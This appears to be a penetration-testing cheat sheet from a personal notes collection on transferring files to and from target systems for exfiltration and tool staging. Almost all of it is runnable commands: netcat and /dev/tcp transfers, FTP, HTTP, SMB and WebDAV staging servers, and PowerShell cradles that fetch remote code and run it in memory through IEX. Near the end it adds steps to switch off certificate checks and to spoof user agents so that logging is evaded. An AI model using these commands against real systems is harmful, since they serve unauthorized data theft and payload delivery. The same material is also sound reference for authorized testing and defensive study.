---
MOC: "[[Offensive Security Concepts MOC]]"
---
-- --
It is often useful to transfer files with a system for exfiltration and adding useful tools. Somethings filter for file types, which can be renamed. If none of these methods work, [GTFOBins](https://gtfobins.org/)/[LOLBAS](https://lolbas-project.github.io/) can help with specific utilities.
## Base64
It is often possible to bas64 encode and copy/paste to the system. It is useful to compare the hash afterwards to make sure everything got through.
```shell
# Linux upload
$ md5sum <FILE>
$ cat <FILE> | base64 -w 0; echo

# Linux download
$ echo -n <BASE64> | base64 -d -w 0 > <FILE>
$ md5sum <FILE>
```
```powershell
# Windows upload
> $b64 = [System.convert]::ToBase64String((Get-Content -Path <FILE> -Encoding Byte))

# Windows download
> [IO.File]::WriteAllBytes("<FILE>", [Convert]::FromBase64String("<BASE64>"))
> Get-FileHash C:\Users\Public\file.txt -Algorithm md5
```
## [[FTP Protocol|FTP]]
Since port 21 requires Administrative/sudo permissions, a higher port can be used as needed.
```shell
# Setup server
$ sudo pip3 install pyftpdlib
$ sudo python3 -m pyftpdlib --port <PORT> --write

# Local upload/download
$ ftp <IP> <PORT>
```
```powershell
# Setup server
> pip3 install pyftpdlib
> python -m pyftpdlib --port <PORT> --write
> New-NetFirewallRule -DisplayName "FTP pyftpdlib 21" -Direction Inbound -Protocol TCP -LocalPort <PORT> -Action Allow

# Windows upload
> (New-Object Net.WebClient).UploadFile('ftp://<IP>:<PORT>/ftp-hosts', '<FILE>')

# Windows download
> (New-Object Net.WebClient).DownloadFile('ftp://<IP>:<PORT>/<FILE>', '<OUTPUT>')
```
## Web
Other [[Windows PowerShell]] download methods [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239).
```shell
# Linux Upload
$ python3 -m http.server
$ php -S 0.0.0.0:8000
# Uploadserver
$ pip3 install uploadserver
$ python3 -m uploadserver
# For the other machine
$ curl -X POST http://<IP>/upload -F 'files=@<FILE>'

# Linux download
$ curl <URL> -O
# TCP version
$ exec 3<>/dev/tcp/10.10.10.32/80
$ echo -e "GET /<FILE> HTTP/1.1\n\n">&3
$ cat <&3
```
```powershell
# Target download
# Downloads <URL> as <OUTPUT>
> (New-Object Net.WebClient).DownloadFile('<URL>','<OUTPUT>') 
# Downloads <URL> as <OUTPUT> asyncronously
> (New-Object Net.WebClient).DownloadFileAsync('<URL>', '<OUTPUT>')
# Downloads <URL> to run in memory
> IEX (New-Object Net.WebClient).DownloadString('<URL>')
# Fix Internet Explorer error
> Invoke-WebRequest <URL> -UseBasicParsing | IEX
# Fix SSL error
>[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# Target upload <FILE>
> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
> Invoke-FileUpload -Uri http://<IP>:8000/upload -File <FILE>
```
## [[The ssh Command|SSH]]
```shell
# Linux upload/download
$ sftp <USER>@<IP>
```
## [[SMB Protocol|SMB]]
```shell
# Local setup
$ sudo impacket-smbserver share - smb2support /tmp/smbshare -user test -password test
# Local setup SMB over HTTP with Webdav
$ mkdir -p /tmp/sharefolder
$ sudo pip3 install wsgidav cheroot
$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

# Local upload
$ mv <FILE> /tmp/sharefolder
# Local download
$ cp /tmp/sharefolder/<FILE> ~
```
```powershell
# Target upload
> copy <FILE> \\<IP>\sharefolder

# Target download
> net use n: \\<IP>\share /user:test
> copy n:\<FILE>
# SMB over HTTP with Webdav
> copy \\<IP>\sharefolder <FILE>
```
## [[Netcat]]
Since `netcat`/`ncat` is typically replaced with `nc`, the settings for `netcat` are slightly different, but mostly similar. 
```shell
# Linux upload
$ nc -q 0 <IP> <PORT> < <FILE>
# Netcat version
$ ncat --send-only <IP> <PORT> < <FILE>

# Linux download
$ nc -l -p <PORT> > <FILE>
# Netcat version
$ ncat -l -p <PORT> --recv-only > <FILE>
# TCP
$ cat < /dev/tcp/<IP>/<PORT> > <FILE>
```
## [[Windows PowerShell|PowerShell]]
```powershell
# Setup
> Test-NetConnection -ComputerName <HOST> -Port <PORT>
> $Session = New-PSSession -ComputerName <HOST>

# Windows upload
> Copy-Item -Path <FILE> -ToSession $Session -Destination <PATH>

# Windows download
> Copy-Item -Path <FILE> -FromSession $Session -Destination <PATH>
```
## RDP
It can be useful to mount a shared folder over RDP.
```shell
# rdesktop
$ rdesktop <IP> -d <NAME> -u <USER> -p <PASSWORD> -r disk:linux='<PATH>'
# xfreerdp
$ xfreerdp /v:<IP> /d:<NAME> /u:<USER> /p:<PASSWORD> /drive:linux,<PATH>
```
# File Encryption
While exfiltrating sensitive data should be avoided, it should at least be encrypted in transit.
```shell
# Encrypt
$ openssl enc -aes256 -iter 100000 -pbkdf2 -in <FILE> -out <File>.enc

# Decrypt
$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <FILE>.enc -out <FILE>
```
```powershell
# Setup
# Get https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
Import-Module .\Invoke-AESEncryption.ps1

# Encrypt
> Invoke-AESEncryption -Mode Encrypt -Key <PASSWORD> -Text <TEXT>
> Invoke-AESEncryption -Mode Encrypt -Key <PASSWORD> -Path <FILE>

# Decrypt
> Invoke-AESEncryption -Mode Decrypt -Key <PASSWORD> -Text <TEXT>
> Invoke-AESEncryption -Mode Decrypt -Key <PASSWORD> -Path <FILE>
```
# User Agent
Some logging systems flag suspicious user agents.
```shell
# Linux
$ curl --user-agent "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6" http://<IP>/<FILE> -O
```
```powershell
# Windows
>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
>$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::<NAME>
> Invoke-WebRequest http://<IP>/<FILE> -UserAgent $UserAgent -OutFile <FILE>
```